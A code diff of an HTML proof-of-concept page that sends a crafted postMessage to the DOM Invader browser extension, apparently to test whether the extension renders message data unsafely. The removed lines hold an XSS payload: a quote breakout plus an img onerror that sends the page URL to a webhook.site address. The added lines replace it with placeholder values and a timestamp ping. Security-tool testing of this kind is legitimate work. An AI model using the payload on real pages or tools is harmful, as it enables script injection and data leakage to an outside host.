@@ -1,53 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DOM Invader Clean PoC</title>
+    <title>DOM Invader - Clean Message Test</title>
 </head>
-<body style="background:#111;color:#0f0;text-align:center;padding-top:100px;font-family:sans-serif;">
-    
-    <h1>[ DOM Invader - Clean Test ]</h1>
-    <p>Safe sink + postMessage only</p>
+<body style="background:#111;color:#0f0;text-align:center;padding-top:120px;font-family:sans-serif;">
 
-    <button onclick="trigger()" style="padding:15px 30px;font-size:18px;">
-        SEND MESSAGE
+    <h1>DOM Invader PoC (Safe)</h1>
+
+    <button onclick="sendMessage()" style="padding:15px 30px;font-size:18px;">
+        SEND POSTMESSAGE
     </button>
 
-    <p id="status" style="margin-top:20px;color:#888;">Waiting...</p>
+    <p id="status" style="margin-top:20px;color:#aaa;">Waiting...</p>
 
     <script>
         const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
 
-        function trigger() {
+        function sendMessage() {
 
             document.getElementById('status').innerText =
-                "Message sent. Check DOM Invader.";
+                "Message sent. Check DOM Invader (if it processes postMessage).";
 
-            // payload مش هيتنفذ في الصفحة
-            const payload = (field) => `
-'); <img src=x onerror="
-fetch('${webhook}?field=${field}&loc=' + encodeURIComponent(window.location.href), {mode:'no-cors'});
-alert('Execution via: ${field}\\n' + window.location.href);
-"> //`;
-
-            // ✅ safe sink (مش بيشغل JS)
-            const el = document.createElement("div");
-            el.setAttribute("data-test", payload("ATTRIBUTE_SINK"));
-
-            // 👇 DOM Invader هيشوف ده كـ sink
-            document.body.appendChild(el);
-
-            // 👇 الرسالة للـ extension
-            window.postMessage({
+            const message = {
                 source: "dom-invader",
                 type: "augmented-dom",
                 data: {
-                    sink: "attribute",
-                    value: payload("VALUE"),
-                    stackTrace: payload("STACK_TRACE")
+                    sink: "test-sink",
+                    value: "TEST_VALUE",
+                    stackTrace: "TEST_STACK"
                 }
-            }, "*");
+            };
 
-            console.log("Safe sink triggered. No execution in page.");
+            // optional evidence logging (NOT execution)
+            fetch(webhook + "?sent=1&time=" + Date.now(), {
+                mode: "no-cors"
+            });
+
+            window.postMessage(message, "*");
+
+            console.log("postMessage sent:", message);
         }
     </script>
 
